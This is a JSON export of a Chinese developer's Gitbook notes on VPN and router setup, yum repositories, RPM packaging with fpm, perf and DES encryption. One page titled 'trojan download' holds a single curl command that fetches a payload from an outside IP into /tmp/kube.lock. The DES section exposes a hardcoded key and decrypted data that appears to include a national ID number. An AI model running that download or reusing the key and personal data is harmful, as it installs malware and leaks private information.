我在本地win7电脑的vm虚拟机上搭建了一个vpn，为什么手机连不上去？ 已经把win7的防火墙关了，用的极路由的没有关闭防火墙的选项，请问要怎样才能成功呢？是要开什么端口么？ 作者答复： 你好！首先你的vm虚拟机必须使用bridge networking，不能用 NAT。然后需要在你的路由器上设置端口转发 UDP 500 和 UDP 4500 到你的虚拟机的 IP 地址。建议设置路由器的 DHCP 的 MAC 地址绑定，以保证虚拟机的 IP 不变。最后你的 ISP 必须分配一个公有 IP （不是 carrier-grade NAT)。 https://gist.github.com/dferg/2278196d736d5b367682 http://webcache.googleusercontent.com/search?q=cache:http://liangshuang.name/2017/06/19/linode-ipsec-vpn/ http://blog.csdn.net/joanna_yan/article/details/50084945 http://www.winwin7.com/JC/Win7JC-1485.html Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"vpn/win7+vm.html":{"url":"vpn/win7+vm.html","title":"本地win7+vm虚拟机实现vpn功能","keywords":"","body":"本地win7+vm虚拟机实现vpn功能 环境： 在百度打ip出现，本机上网ip地址：101.81.226.213 虚拟机中的ip地址：192.168.199.144 （可以在路由器中DHCP服务绑定ip，固定虚拟机ip） 我的问题： 我在本地win7电脑的vm虚拟机上搭建了一个vpn，为什么手机连不上去？ 已经把win7的防火墙关了，用的极路由的没有关闭防火墙的选项，请问要怎样才能成功呢？是要开什么端口么？ 作者答复： 你好！首先你的vm虚拟机必须使用bridge networking，不能用 NAT。然后需要在你的路由器上设置端口转发 UDP 500 和 UDP 4500 到你的虚拟机的 IP 地址。建议设置路由器的 DHCP 的 MAC 地址绑定，以保证虚拟机的 IP 不变。最后你的 ISP 必须分配一个公有 IP （不是 carrier-grade NAT)。 我的操作 step1 设置虚拟机桥接模式: 图片 - 20170714105757.png 重新连接查看虚拟机ip地址: 图片 - 20170714110125.png 为：192.168.199.144 查看需要路由器转发的端口： 图片 - images/20170714111847.png step2 在路由器上设置端口转发到虚拟机中: 图片 - 20170714103608.png 可以看到协议是udp类型，端口号是500和4500 step3 固定虚拟机ip地址 图片 - 20170714110818.png 完成，以上步骤完成之后，手机上连接即可成功，局域网和外网都行！！ 图片 - 20170714111239.jpg 验证成功： 图片 - 20170714111320.jpg 参考文档： https://github.com/hwdsl2/docker-ipsec-vpn-server/issues/31 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"vpn/win7连接.html":{"url":"vpn/win7连接.html","title":"之前一直连不上，后面发现，原来是路由器搞的鬼。。在路由器里面设置出站udp协议,500,4500端口就行","keywords":"","body":"之前一直连不上，后面发现，原来是路由器搞的鬼。。在路由器里面设置出站udp协议,500,4500端口就行 iptables -A OUTPUT -p udp --sport 500 -j ACCEPT iptables -A OUTPUT -p udp --sport 4500 -j ACCEPT Windows 7, Vista and XP 单击开始菜单，选择控制面板。 进入 网络和Internet 部分。 单击 网络与共享中心。 单击 设置新的连接或网络。 选择 连接到工作区，然后单击 下一步。 单击 使用我的Internet连接 (VPN)。 在 Internet地址 字段中输入你的 VPN 服务器 IP。 在 目标名称 字段中输入任意内容。 选中 现在不连接；仅进行设置以便稍后连接 复选框。 单击 下一步。 在 用户名 字段中输入你的 VPN 用户名。 在 密码 字段中输入你的 VPN 密码。 选中 记住此密码 复选框。 单击 创建，然后单击 关闭 按钮。 返回 网络与共享中心。单击左侧的 更改适配器设置。 右键单击新创建的 VPN 连接，并选择 属性。 单击 选项 选项卡，取消选中 包括Windows登录域 复选框。 单击 安全 选项卡，从 VPN 类型 下拉菜单中选择 \"使用 IPsec 的第 2 层隧道协议 (L2TP/IPSec)\"。 单击 允许使用这些协议。确保选中 \"质询握手身份验证协议 (CHAP)\" 复选框。 单击 高级设置 按钮。 单击 使用预共享密钥作身份验证 并在 密钥 字段中输入你的 VPN IPsec PSK。 单击 确定 关闭 高级设置。 单击 确定 保存 VPN 连接的详细信息。 修改：数据加密选，不加密 注： 在首次连接之前需要修改一次注册表，以解决 VPN 服务器 和/或 客户端与 NAT （比如家用路由器）的兼容问题。 修改方法参考-->809错误 要连接到 VPN： 单击系统托盘中的无线/网络图标，选择新的 VPN 连接，然后单击 连接。如果出现提示，在登录窗口中输入 你的 VPN 用户名 和 密码 ，并单击 确定。最后你可以到 这里 检测你的 IP 地址，应该显示为你的 VPN 服务器 IP。 vpn连接截图 step1 : 图片 - images/20170714172420.png 图片 - images/20170714171957.png 预共享秘钥 图片 - images/20170714172237.png 问题汇总 809错误，首次连接需修改注册表 Windows 错误 809,完成后必须重启计算机 For Windows Vista, 7, 8, 10, and 2008 Server: 修改注册表,cmd->regedit.exe： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PolicyAgent RegValue: AssumeUDPEncapsulationContextOnSendRule Type: DWORD Data Value: 2 方法2，用管理员权限打开cmd： REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\PolicyAgent /v AssumeUDPEncapsulationContextOnSendRule /t REG_DWORD /d 0x2 /f 重启动！！！！ 2、启动服务 Win+R打开“运行”对话框，输入services.msc，打开“服务\"（或者在控制面板里搜索“服务”，查看本地服务） 将一下几个服务设为自动： IPsec Policy Agent Routing and Remote Access Remote Access Auto Connection Manager Remote Access Connection Manager Secure Socket Tunneling Protocol Service 3、重启计算机，即可使用L2TP。 win7死活连不上，猜测可能跟极路由的防火墙有关。 前几天买了几个月的vpn软件，一遇上极路由死活都连不上，连上也是卡死人的节奏。。。一研究原来是极路由自带的防火墙在搞鬼，更可恨的是这货的防火墙竟然没有一个设置界 后来跑到极路由里面设置vpn,等待了2分钟之后，居然连接成功了,但是，这等于让路由器下面的所有人都能通过vpn上网，这大大增加了vpn的流量了。 最后，在极路由里面找到一个iptables插件，通过设置udp的出站，本机终于能连上vpn啦。 ipables填写2条出站命令： iptables -A OUTPUT -p udp --sport 500 -j ACCEPT iptables -A OUTPUT -p udp --sport 4500 -j ACCEPT 在极路由里面添加插件，然后设置： 789错误（一般会和809错误冲突，可忽略此错误！！）： 修改注册表来实现 1. 单击“开始”，单击“运行”，键入“regedit”，然后单击“确定” 2. 找到下面的注册表子项，然后单击它： HKEY_LOCAL_MACHINE\\ System\\CurrentControlSet\\Services\\Rasman\\Parameters 3. 在“编辑”菜单上，单击“新建”->“DWORD值” 4. 在“名称”框中，键入“ProhibitIpSec” 5. 在“数值数据”框中，键入“1”，然后单击“确定” 6. 退出注册表编辑器，然后重新启动计算机 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"yum/build-warehouse.html":{"url":"yum/build-warehouse.html","title":"yum仓库搭建","keywords":"","body":"yum仓库搭建 服务端配置 1.创建 yum 仓库目录，rpm 包都上至此目录 mkdir -p /home/yum/centos7/x86_64/ 2. 安装 createrepo 软件 yum -y install createrepo 3. 初始化 repodata 索引文件 createrepo -pdo /home/yum/centos7/x86_64/ /home/yum/centos7/x86_64/ 4. 进入需要提供仓库的目录 cd /home/yum/centos7/x86_64/ 5. 可以用 Apache 或 Nginx 提供 Web 服务 但用 Python 的 http 模块更简单，适用于内网环境，可以通过浏览器输入本机 IP 查看。 python -m SimpleHTTPServer 80 &>/dev/null & 浏览器打开显示： 图片 - images 6. 每加入一个 rpm 包就要更新一下 将之前制作好的rpm包上传到/home/yum/centos7/x86_64/ 目录下，然后更新索引。 此时的文件有： [root@ceph-admin x86_64]# ls repodata ZphoneServer-1.0.0-1.x86_64.rpm createrepo --update /home/yum/centos7/x86_64/ 报错： Error: Only one directory allowed per run. Usage: genpkgmetadata.py [options] 解决： 检查命令是否正确，--update不要写成-update 修改 yum 配置文件 keepacache=0 改为 1，保存下载过的软件 sed -i 's#keepcache=0#keepcache=1#g' /etc/yum.conf 之前的文件: [root@ceph-admin x86_64]# cat /etc/yum.conf [main] cachedir=/var/cache/yum/$basearch/$releasever keepcache=0 debuglevel=2 logfile=/var/log/yum.log exactarch=1 obsoletes=1 gpgcheck=1 plugins=1 installonly_limit=5 bugtracker_url=http://bugs.centos.org/set_project.php?project_id=23&ref=http://bugs.centos.org/bug_report_page.php?category=yum distroverpkg=centos-release # This is the default, if you make this bigger yum won't see if the metadata # is newer on the remote and so you'll \"gain\" the bandwidth of not having to # download the new metadata and \"pay\" for it by yum not having correct # information. # It is esp. important, to have correct metadata, for distributions like # Fedora which don't keep old packages around. If you don't like this checking # interupting your command line usage, it's much better to have something # manually check the metadata once an hour (yum-updatesd will do this). # metadata_expire=90m # PUT YOUR REPOS HERE OR IN separate files named file.repo # in /etc/yum.repos.d 修改之后的文件: [root@ceph-admin x86_64]# cat /etc/yum.conf [main] cachedir=/var/cache/yum/$basearch/$releasever keepcache=1 debuglevel=2 logfile=/var/log/yum.log exactarch=1 obsoletes=1 gpgcheck=1 plugins=1 installonly_limit=5 bugtracker_url=http://bugs.centos.org/set_project.php?project_id=23&ref=http://bugs.centos.org/bug_report_page.php?category=yum distroverpkg=centos-release # This is the default, if you make this bigger yum won't see if the metadata # is newer on the remote and so you'll \"gain\" the bandwidth of not having to # download the new metadata and \"pay\" for it by yum not having correct # information. # It is esp. important, to have correct metadata, for distributions like # Fedora which don't keep old packages around. If you don't like this checking # interupting your command line usage, it's much better to have something # manually check the metadata once an hour (yum-updatesd will do this). # metadata_expire=90m # PUT YOUR REPOS HERE OR IN separate files named file.repo # in /etc/yum.repos.d 客户端配置 在另外一台服务器上，例如：192.168.122.148 自定义zhg.repo文件 cd /etc/yum.repos.d vi zhg.repo [zhg] #指定使用zhg库 name=Server baseurl=http://192.168.122.151 #yum仓库ip enable=1 #开启什么模块 gpgcheck=0 #是否检查gpg 指定使用zhg库 yum --enablerepo=zhg --disablerepo=base,extras,updates,epel list 安装库中的软件 yum -y install ZphoneServer # 安装软件 systemctl start ZphoneServer # 启动软件 systemctl status ZphoneServer # 查看状态 yum remove ZphoneServer #卸载软件 问题汇总： Q1: http://192.168.122.151/repodata/repomd.xml: [Errno 12] Timeout on http://192.168.122.151/repodata/repomd.xml: (28, 'Operation too slow. Less than 1000 bytes/sec transferred the last 30 seconds') A1: 检查repodata目录下是否有repomd.xml文件，这个文件是自动生成的。 参考文档 http://jcenter.idcos.com/?/article/28 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"yum/install-service-sh.html":{"url":"yum/install-service-sh.html","title":"自动生成service脚本","keywords":"","body":"自动生成service脚本 #!/bin/bash touch /usr/lib/systemd/system/gdash.service echo \"[Unit]\" > /usr/lib/systemd/system/gdash.service echo \"Description=gdash: GlusterFS Dashboard\">> /usr/lib/systemd/system/gdash.service echo \"After=glusterd.service\" >> /usr/lib/systemd/system/gdash.service echo >> /usr/lib/systemd/system/gdash.service echo \"[Service]\" >> /usr/lib/systemd/system/gdash.service echo \"type=simple\" >> /usr/lib/systemd/system/gdash.service echo \"ExecStart=/usr/bin/gdash -p 80\" >> /usr/lib/systemd/system/gdash.service echo >> /usr/lib/systemd/system/gdash.service echo \"[Install]\" >> /usr/lib/systemd/system/gdash.service echo \"WantedBy=multi-user.target\" >> /usr/lib/systemd/system/gdash.service systemctl start gdash systemctl enable gdash 或者: #!/usr/bin/bash /usr/bin/cp *.service /usr/lib/systemd/system/ /usr/bin/cp *.timer /usr/lib/systemd/system/ 使用yum 安装rpm包的时候，不需要用sh脚本来生成service，只需要把/usr/lib/systemd/system/要用到的service打包进rpm里面就行。 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"yum/make-self-rpm-ubuntu.html":{"url":"yum/make-self-rpm-ubuntu.html","title":"安装ruby","keywords":"","body":"安装ruby sudo apt install ruby sudo apt-get intall ruby-dev sudo apt-get install rpm (#含有rpmbuild包) sudo gem install fpm 打包fpm cd /usr/local/software/zrule && chmod +x ZruleServer sudo fpm -s dir -t rpm -n ZruleServer -v 1.0.0 --config-files /usr/lib/systemd/system/ZruleServer.service -f /usr/local/software/zrule 问题汇总 Q1: ERROR: Failed to build gem native extension. A1: 在Ubuntu 默认的apt-get安装ruby时，没有安装ruby-dev，需在terminal中输入sudo apt-get intall ruby-dev 即可。亲测，问题解决。 [https://blog.csdn.net/csvdvg/article/details/62444144](https://blog.csdn.net/csvdvg/article/details/62444144) Q2: Need executable 'rpmbuild' to convert dir to rpm {:level=>:error} A2: 制作 rpm 包需要用到 rpmbuild 工具。在 ubuntu 上，该工具包含在 rpm 包中，可以直接从源里安装： sudo apt-get install rpm Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"yum/make-self-rpm.html":{"url":"yum/make-self-rpm.html","title":"自己制作rpm软件包，方便使用yum安装软件","keywords":"","body":"自己制作rpm软件包，方便使用yum安装软件 安装fpm打包工具 1.安装ruby，因为fpm是ruby编写的。 [root@k8s-master1 ~]# ruby -v ruby 2.5.0p0 (2017-12-25 revision 61468) [x86_64-linux] 我的机子上，前几天已经安装好了ruby,安装方法可查看本库ruby模块。 2.安装fpm gem install fpm 版本: [root@k8s-master1 ~]# fpm --version 1.9.3 常用参数: -s 指定源类型 -t 指定目标类型，即想要制作为什么包 -n 指定包的名字 -v 指定包的版本号 -C 指定打包的相对路径 Change directory to here before searching forfiles -d 指定依赖于哪些包 -f 第二次打包时目录下如果有同名安装包存在，则覆盖它 -p 输出的安装包的目录，不想放在当前目录下就需要指定 --post-install 软件包安装完成之后所要运行的脚本；同--after-install --pre-install 软件包安装完成之前所要运行的脚本；同--before-install --post-uninstall 软件包卸载完成之后所要运行的脚本；同--after-remove --pre-uninstall 软件包卸载完成之前所要运行的脚本；同--before-remove 所有配置: -f :强制覆盖[覆盖同名rpm包] -n :指定的rpm包名 -p :指定的rpm包文件放置位置 -v :指定的rpm包版本 -d :指定依赖的软件 ( [-d 'name'] or [-d 'name > version'] 例子: -d 'libstdc++ >= 4.4.3') -a :指定系统架构,如果是noarch则为'-a all' 或者 '-a native' [x86_64] 当软件不区分64位或32位的时候可以 noarch -s :指定INPUT的数据类型 ([\"-s dir\"] 省略数据类型) -m :指定打包人员[Packager] ([ -m 'user']) -C :指定打包的相对路径,类似于buildroot. 譬如-C /tmp/apr/ 而打包机器的数据包路径是/tmp/apr/{opt,usr,etc} 那安装这个rpm包后,在本地的数据就是/opt/,/usr/,/etc/ -t :指定需要制作成什么包,可选项有(deb,rpm,solaris,etc) 支持的源类型:： \"dir\" \"rpm\" \"gem\" \"python\" \"empty\" \"tar\" \"deb\" \"cpan\" \"npm\" \"osxpkg\" \"pear\" \"pkgin\" \"virtualenv\" \"zip\" 支持的目标类型: \"rpm\" \"deb\" \"solaris\" \"puppet\" \"dir\" \"osxpkg\" \"p5p\" \"puppet\" \"sh\" \"solaris\" \"tar\" \"zip\" --description :软件包描述 --conflicts :指定冲突软件 --url :指定站点[惯例都是添加软件的官网 例如: --url \"http://www.cnblog.com/roach57\" ] --verbose :安装过程详细打印 --after-install :包安装之后执行的脚本 也可写作 --post-install FILE --before-install :包安装之前执行的脚本 --after-remove :包卸载之后执行的脚本 --before-remove :包卸载之前执行的脚本 --after-upgrade :包更新之后执行的脚本[仅支持 deb 和 rpm 这两种包] --before-upgrade :包更新之前执行的脚本 --iteration :发布序号[就是rpm包里面的release] --epoch :纪元 [不知道干嘛用的] --no-rpm-sign :不使用rpm签名 Signature --license :证书许可 [可选项有 'BSD(开源软件)' 'GPLv2(自由软件)' 'MIT' 'Public Domain(公共域)' 'Distributable(贡献)' 'commercial(商业)' 'Share(共享)等',一般的开发都写'BSD'或'GPL'] --vendor :供应商名称 [ --vendor 'roach57@163.com'] --no-depends :代表没有任何依赖包,和-d是对立的,不能共用 --config-files :指定配置文件,可以指定目录[递归] --directories :指定包目录 --category :软件所属的类别[这是个什么软件]下面有个对应的表格: [参考这个文件 /usr/share/doc/rpm-x.x.x/GROUPS ] Amusements/Games [娱乐/游戏] Amusements/Graphics [娱乐/图形] Applications/Archiving [应用/文档] Applications/Communications [应用/通讯] Applications/Databases [应用/数据库] Applications/Editors [应用/编辑器] Applications/Emulators [应用/仿真器] Applications/Engineering [应用/工程] Applications/File [应用/文件] Applications/Internet [应用/因特网] Applications/Multimedia [应用/多媒体] Applications/Productivity [应用/产品] Applications/Publishing [应用/印刷] Applications/System [应用/系统] Applications/Text [应用/文本] Development/Debuggers [开发/调试器] Development/Languages [开发/语言] Development/Libraries [开发/函数库] Development/System [开发/系统] Development/Tools [开发/工具] Documentation [文档] System Environment/Base [系统环境/基础] System Environment/Daemons [系统环境/守护] System Environment/Kernel [系统环境/内核] System Environment/Libraries [系统环境/函数库] System Environment/Shells [系统环境/接口] User Interface/Desktops [用户界面/桌面] User Interface/X [用户界面/X窗口] User Interface/X Hardware Support [用户界面/X硬件支持] 组成格式: roach-1.0.1-57.el6.x86_64.rpm | | | | | 软件名称| | | | 版本号 | |　　 | 发布号 | | 硬件平台 | 扩展名 例子备注: roach :软件名称 1.0.1 :软件版本号 57.el6 :发布号主要是对软件存在的bug或漏洞进行修补,在软件功能上并没有变化,el6指的是rhel6系统中发布 x86_64 :指64位的PC架构,另外还有'i386' 'i686' 等32位的PC架构,noarch是指不区分硬件架构 rpm :扩展名 3.制作软件包 mkdir -p /nfs_file/software/rpm && cd /nfs_file/software/rpm fpm -s dir -t rpm -n ZphoneServer -v 1.0.0 -f /nfs_file/software/zphone 查看： [root@k8s-master1 rpm]# ls ZphoneServer-1.0.0-1.x86_64.rpm 居然能生成一个rpm包了。 之前还对上面的命令一知半解，不知道啥情况的，看了很多帖子，都搞的莫名其妙，原来fpm包只是将软件的安装目录下的所有文件，打包放进了rpm里面了。所以什么也在这之前，什么也不需要做，只需要有个等待打包进rpm的目录即可。 将rpm包下载下来，解压再解压之后，发现就是那个目录下所有的文件。 4.安装rpm软件 yum localinstall ZphoneServer-1.0.0-1.x86_64.rpm 发现只有个二进制文件在这里，因为没有把services文件打包进rpm，所以目前不能用systemctl start/stop ZphoneServer 来管理软件。 5.卸载rpm软件 yum remove -y ZphoneServer 6.启动rpm软件 这次重新将启动文件(ZphoneServer.service)也打包进rpm包里面 fpm -s dir -t rpm -n ZphoneServer -v 1.0.0 --config-files /usr/lib/systemd/system/ZphoneServer.service -f /nfs_file/software/zphone 查看rpm包文件 rpm -qpl ZphoneServer-1.0.0-1.x86_64.rpm 显示: [root@k8s-master1 rpm]# rpm -qpl ZphoneServer-1.0.0-1.x86_64.rpm /nfs_file/software/zphone/ZphoneServer /nfs_file/software/zphone/phone.dat /usr/lib/systemd/system/ZphoneServer.service 将rpm包上传到另外一台服务器，安装rpm包: yum localinstall -y ZphoneServer-1.0.0-1.x86_64.rpm 启动: systemctl start ZphoneServer systemctl status ZphoneServer 注:此处不再需要 systemctl daemon-reload 重新加载配置 问题汇总: Q: Need executable 'rpmbuild' to convert dir to rpm {:level=>:error} A: 出现这种情况就是需要安装rpm-build yum install -y rpm-build 参考文档: https://darknode.in/linux/static-pack-apps/ http://www.iersai.com/archives/63 http://www.cnblogs.com/Roach57/p/5130283.html https://github.com/jordansissel/fpm/issues/463 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"yum/practice.html":{"url":"yum/practice.html","title":"1.环境","keywords":"","body":"1.环境 服务器:47.100.76.132 端口:8081 2.服务端搭建 安装软件: mkdir -p /home/yum/centos7/x86_64/ yum -y install createrepo createrepo -pdo /home/yum/centos7/x86_64/ /home/yum/centos7/x86_64/ cd /home/yum/centos7/x86_64/ python -m SimpleHTTPServer 8081 &>/dev/null & http://blog.csdn.net/why19940926/article/details/62054757 将rpm软件上传到/home/yum/centos7/x86_64目录下，然后更新： createrepo --update /home/yum/centos7/x86_64/ 浏览器浏览： http://47.100.76.132:8081/ 图片 - images 3.客户端访问 cd /etc/yum.repos.d vi zhg.repo [zhg] name=Server baseurl=http://47.100.76.132:8081 enable=1 gpgcheck=0 指定使用zhg库 yum --enablerepo=zhg --disablerepo=base,extras,updates,epel list 4.安装软件 yum install -y ZphoneServer systemctl start ZphoneServer #启动软件 systemctl status ZphoneServer #查看状态 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"性能分析/火焰图.html":{"url":"性能分析/火焰图.html","title":"perf","keywords":"","body":"perf ubuntu安装: sudo apt install linux-tools-common sudo apt install linux-tools-4.15.0-22-generic 使用: perf record -F 99 -p 13204 -g -- sleep 30 cpu火焰图表现好了几个百分点。另外通过wrk压测qps也是可以看到提升的 。 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"木马/木马.html":{"url":"木马/木马.html","title":"木马下载","keywords":"","body":"木马下载 curl http://185.10.68.202:5050/mrx -o /tmp/kube.lock Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"语言对比/array.html":{"url":"语言对比/array.html","title":"介绍","keywords":"","body":"介绍 array 也可写作 [] php: array( 'k1'=>'v1', 'k2'=>'v2' ); python: 在python中array，关联数组被称字典(Dictionary),可设置k,v值。索引数组被称为[]为列表(List),不能自定义k值。 关联array: #!/usr/bin/python dict = {'Name': 'Zara', 'Age': 7, 'Class': 'First'}; print \"dict['Name']: \", dict['Name']; print \"dict['Age']: \", dict['Age']; type: print(type(arrDict)) 索引array: #!/usr/bin/python list1 = ['physics', 'chemistry', 1997, 2000] list2 = [1, 2, 3, 4, 5, 6, 7 ] print \"list1[0]: \", list1[0] print \"list2[1:5]: \", list2[1:5] 以上实例输出结果： list1[0]: physics list2[1:5]: [2, 3, 4, 5] Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"语言对比/python_php_DES加密解密算法实现.html":{"url":"语言对比/python_php_DES加密解密算法实现.html","title":"DES加密解密 (PHP&Python版本对比)","keywords":"","body":"DES加密解密 (PHP&Python版本对比) php和python语言实现一致的DES加密解密算法,纠结了一下午了，各种不符合的DES加密解密一堆，后来才发现php7.x的mcrypt被弃用了。 DES解密 (python版) #!/usr/bin/env python # -*- coding: utf-8 -*- import pyDes import base64 encrypt_text='jix38dgQ7NydmcrakkLDlBimzmwbu06j2/0KQ+fWUoCqKtjt/zsexhOL7BvCTTFjIt/ksFQ30iD9uAZrFfL2l33Mcz5LvjSCIiJGsJtRMzUyR+aAanf4gwaZG/7Lek0Hu1+2gnZPT5GEGs/bBhqYn7/dGC5aXoBsXYFwERxkzLXG7Pg7ImI16o5FzteuRiUFTFN7/4WkPtbLOWtna6tm6xBNpdTrqCv64QZBb/kSXTRJOQAJQgRbsd0qzu4ch63UpW7pe8cuR8T90HbFKUFrMzdjkErQdftrqhdEFjK9xLy34sFtG8OWVu5+M6wrXxBPxajDOkHdP7Je0tQenIoTM+HKlClFV4tR/8A2MU2YVpRyqxOGtr2/mQryw4Jzd8XK'; encrypt_text = base64.decodestring(encrypt_text) des_key = 'fN/HWN910Kc=' des_key = base64.decodestring(des_key) des_obj = pyDes.des(des_key, pyDes.ECB, \"\\0\\0\\0\\0\\0\\0\\0\\0\", pad=None, padmode=pyDes.PAD_PKCS5) print 'des_key: ', des_key xml=des_obj.decrypt(encrypt_text) print 'decrypt: ', xml.decode('gbk').encode('utf-8') 显示: zhg@zhg-ThinkPad-E450c:~/workspaces/marketing-public-api/application/models/client$ python2.7 des.py des_key: |��X�uЧ decrypt: 01440300198607060590测试fcb6432818516573852TK_DEFAULT567650000000064328 DES解密 (php版) 显示: zhg@zhg-ThinkPad-E450c:~/workspaces/zphpjwt$ php des.php des_key: |��X�uЧdecrypt: 01440300198607060590测试fcb6432818516573852TK_DEFAULT567650000000064328 DES加密 (python版) #!/usr/bin/env python # -*- coding: utf-8 -*- import pyDes import base64 body_xml='01440300198607060590测试fcb6432818516573852TK_DEFAULT567650000000064328' body_xml=body_xml.decode('utf-8').encode('gbk') des_key = 'fN/HWN910Kc=' des_key = base64.decodestring(des_key) des_obj = pyDes.des(des_key, pyDes.ECB, \"\\0\\0\\0\\0\\0\\0\\0\\0\", pad=None, padmode=pyDes.PAD_PKCS5) print 'des_key: ', des_key encrypt_txt = des_obj.encrypt(body_xml) encrypt_txt = base64.encodestring(encrypt_txt) print 'encrypt: ',encrypt_txt 显示: zhg@zhg-ThinkPad-E450c:~/workspaces/marketing-public-api/application/models/client$ python2.7 des_enc.py des_key: |��X�uЧ encrypt: jix38dgQ7NydmcrakkLDlBimzmwbu06j2/0KQ+fWUoCqKtjt/zsexhOL7BvCTTFjIt/ksFQ30iD9 uAZrFfL2l33Mcz5LvjSCIiJGsJtRMzUyR+aAanf4gwaZG/7Lek0Hu1+2gnZPT5GEGs/bBhqYn7/d GC5aXoBsXYFwERxkzLXG7Pg7ImI16o5FzteuRiUFTFN7/4WkPtbLOWtna6tm6xBNpdTrqCv64QZB b/kSXTRJOQAJQgRbsd0qzu4ch63UpW7pe8cuR8T90HbFKUFrMzdjkErQdftrqhdEFjK9xLy34sFt G8OWVu5+M6wrXxBPxajDOkHdP7Je0tQenIoTM+HKlClFV4tR/8A2MU2YVpRyqxOGtr2/mQryw4Jz d8XK DES加密 (php版) 01440300198607060590测试fcb6432818516573852TK_DEFAULT567650000000064328'; $body_xml=iconv(\"utf-8\", \"gbk//ignore\", $body_xml); $des_key = 'fN/HWN910Kc='; $des_key = base64_decode($des_key); echo 'des_key: '.$des_key; $des_obj=openssl_encrypt ($body_xml, 'des-ecb', $des_key,true,''); $encrypt_txt=base64_encode($des_obj); echo 'encrypt: '. $encrypt_txt; ?> 显示: zhg@zhg-ThinkPad-E450c:~/workspaces/zphpjwt$ php des_enc.php des_key: |��X�uЧencrypt: jix38dgQ7NydmcrakkLDlBimzmwbu06j2/0KQ+fWUoCqKtjt/zsexhOL7BvCTTFjIt/ksFQ30iD9uAZrFfL2l33Mcz5LvjSCIiJGsJtRMzUyR+aAanf4gwaZG/7Lek0Hu1+2gnZPT5GEGs/bBhqYn7/dGC5aXoBsXYFwERxkzLXG7Pg7ImI16o5FzteuRiUFTFN7/4WkPtbLOWtna6tm6xBNpdTrqCv64QZBb/kSXTRJOQAJQgRbsd0qzu4ch63UpW7pe8cuR8T90HbFKUFrMzdjkErQdftrqhdEFjK9xLy34sFtG8OWVu5+M6wrXxBPxajDOkHdP7Je0tQenIoTM+HKlClFV4tR/8A2MU2YVpRyqxOGtr2/mQryw4Jzd8XK Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-27 22:27:19 "}}